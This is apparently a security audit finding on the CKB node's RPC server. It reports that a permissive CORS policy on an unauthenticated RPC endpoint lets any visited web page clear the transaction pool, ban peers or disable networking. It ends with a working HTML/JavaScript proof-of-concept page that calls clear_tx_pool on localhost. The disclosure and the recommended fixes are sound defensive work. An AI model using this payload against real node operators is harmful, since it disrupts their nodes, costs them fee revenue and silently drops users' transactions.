### Title
Permissive CORS Policy on Unauthenticated RPC Server Enables Cross-Origin State Manipulation — (File: `rpc/src/server.rs`)

---

### Summary
The CKB RPC HTTP server unconditionally applies `CorsLayer::permissive()`, setting `Access-Control-Allow-Origin: *` on every response. Because the RPC has no authentication, any web page visited by a node operator can issue cross-origin JSON-RPC calls to `http://127.0.0.1:8114` and invoke state-modifying methods — including `clear_tx_pool`, `clear_tx_verify_queue`, `remove_transaction`, `set_ban`, `set_network_active`, `add_node`, and `remove_node` — without any user interaction beyond visiting the page.

---

### Finding Description

`RpcServer::start_server` builds the Axum router and unconditionally layers `CorsLayer::permissive()`:

```rust
// rpc/src/server.rs  line 119-129
let app = Router::new()
    .route("/", method_router.clone())
    .route("/{*path}", method_router)
    .route("/ping", get(ping_handler))
    .layer(Extension(Arc::clone(rpc)))
    .layer(CorsLayer::permissive())          // ← root cause
    .layer(TimeoutLayer::with_status_code(
        StatusCode::REQUEST_TIMEOUT,
        Duration::from_secs(30),
    ))
    .layer(Extension(stream_config));
```

`tower_http::cors::CorsLayer::permissive()` emits:

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: *
Access-Control-Allow-Headers: *
Access-Control-Max-Age: 86400
```

on every preflight and actual response. The browser's same-origin policy therefore permits any origin to both **send** the request and **read** the response.

The RPC server has no authentication layer. The default module set enabled in production is `["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"]`. Within those modules the following methods require no signature, no PoW, and no secret:

| Module | Method | Effect |
|--------|--------|--------|
| Pool | `clear_tx_pool` | Drops every pending transaction |
| Pool | `clear_tx_verify_queue` | Drops every transaction awaiting verification |
| Pool | `remove_transaction(tx_hash)` | Evicts a specific transaction |
| Net | `set_ban(addr, "insert", ...)` | Bans a peer IP/subnet |
| Net | `set_network_active(false)` | Disables all P2P networking |
| Net | `add_node` / `remove_node` | Manipulates peer connections |

The `clear_tx_pool` implementation directly calls `tx_pool_controller.clear_pool(snapshot)` with no additional authorization check:

```rust
// rpc/src/module/pool.rs  line 684-692
fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool
        .clear_pool(snapshot)
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}
```

---

### Impact Explanation

**For a mining node operator:** A malicious page can silently call `clear_tx_pool()` in a loop, continuously evicting all pending transactions. The miner assembles empty or near-empty blocks, forfeiting all transaction fee revenue for the duration of the attack.

**For any node operator:** `set_ban` can be called to ban all known good peers by subnet, or `set_network_active(false)` can be called to disable P2P networking entirely, isolating the node from the network. This prevents the node from receiving new blocks or relaying transactions, causing it to fall behind the chain tip.

**For transaction senders relying on a specific node:** `remove_transaction(tx_hash)` can be called with a known hash to silently drop a pending transaction from the pool, causing it to never be confirmed without the sender's knowledge.

These are permanent state changes (until the operator manually intervenes) that directly affect consensus participation, fee revenue, and transaction finality.

---

### Likelihood Explanation

The attack requires only that the node operator opens a browser tab to a page under attacker control while the CKB node is running. This is a realistic scenario for developers, miners, and exchange operators who run nodes on their workstations or servers they also browse from.

**Browser compatibility:**
- **Firefox** (all versions): no Private Network Access (PNA) restriction; cross-origin requests to `127.0.0.1` succeed.
- **Chrome < 94 / Chromium-based browsers without PNA**: same as Firefox.
- **Chrome ≥ 94 with PNA enforced**: preflight to a non-HTTPS localhost endpoint from an HTTPS origin is blocked. However, the CKB RPC is plain HTTP, and an attacker page served over HTTP (or a local file) bypasses PNA entirely.

No special network position, no leaked credentials, and no privileged role are required. The attacker only needs to serve a page that the operator visits.

---

### Recommendation

1. Replace `CorsLayer::permissive()` with a restrictive policy that allows only explicitly trusted origins (e.g., `127.0.0.1` itself, or a configurable allowlist). If cross-origin access is not needed, use `CorsLayer::new()` with no allowed origins.
2. Add an optional shared-secret token (configurable in `ckb.toml`) that must be present in a request header for all state-modifying RPC methods, so that cross-origin requests lacking the token are rejected at the application layer.
3. Respond to PNA preflight requests with `Access-Control-Allow-Private-Network: false` (or omit the header) to block Chrome's PNA-aware cross-origin requests to localhost.

---

### Proof of Concept

With a CKB node running on `127.0.0.1:8114`, the following page — served from any origin — clears the transaction pool:

```html
<!-- attacker.example.com/attack.html -->
<script>
fetch("http://127.0.0.1:8114", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    id: 1, jsonrpc: "2.0",
    method: "clear_tx_pool", params: []
  })
})
.then(r => r.json())
.then(console.log);   // {"id":1,"jsonrpc":"2.0","result":null}
</script>
```

Because `CorsLayer::permissive()` returns `Access-Control-Allow-Origin: *` on the preflight OPTIONS response, the browser proceeds with the POST and the response is readable. The same pattern applies to `set_ban`, `set_network_active`, `remove_transaction`, and all other unauthenticated state-modifying methods in the default module set. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** rpc/src/server.rs (L31-32)
```rust
use tower_http::cors::CorsLayer;
use tower_http::timeout::TimeoutLayer;
```

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/module/pool.rs (L322-323)
```rust
    #[rpc(name = "clear_tx_pool")]
    fn clear_tx_pool(&self) -> Result<()>;
```

**File:** rpc/src/module/pool.rs (L684-692)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** rpc/src/module/net.rs (L335-343)
```rust
    #[rpc(name = "set_ban")]
    fn set_ban(
        &self,
        address: String,
        command: String,
        ban_time: Option<Timestamp>,
        absolute: Option<bool>,
        reason: Option<String>,
    ) -> Result<()>;
```

**File:** rpc/README.md (L99-116)
```markdown
        * [Method `clear_banned_addresses`](#net-clear_banned_addresses)
        * [Method `set_ban`](#net-set_ban)
        * [Method `sync_state`](#net-sync_state)
        * [Method `set_network_active`](#net-set_network_active)
        * [Method `add_node`](#net-add_node)
        * [Method `remove_node`](#net-remove_node)
        * [Method `ping_peers`](#net-ping_peers)
    * [Module Pool](#module-pool) [👉 OpenRPC spec](http://playground.open-rpc.org/?uiSchema[appBar][ui:title]=CKB-Pool&uiSchema[appBar][ui:splitView]=false&uiSchema[appBar][ui:examplesDropdown]=false&uiSchema[appBar][ui:logoUrl]=https://raw.githubusercontent.com/nervosnetwork/ckb-rpc-resources/develop/ckb-logo.jpg&schemaUrl=https://raw.githubusercontent.com/nervosnetwork/ckb-rpc-resources/develop/json/pool_rpc_doc.json)

        * [Method `send_transaction`](#pool-send_transaction)
        * [Method `test_tx_pool_accept`](#pool-test_tx_pool_accept)
        * [Method `remove_transaction`](#pool-remove_transaction)
        * [Method `tx_pool_info`](#pool-tx_pool_info)
        * [Method `clear_tx_pool`](#pool-clear_tx_pool)
        * [Method `clear_tx_verify_queue`](#pool-clear_tx_verify_queue)
        * [Method `get_raw_tx_pool`](#pool-get_raw_tx_pool)
        * [Method `get_pool_tx_detail_info`](#pool-get_pool_tx_detail_info)
        * [Method `tx_pool_ready`](#pool-tx_pool_ready)
```
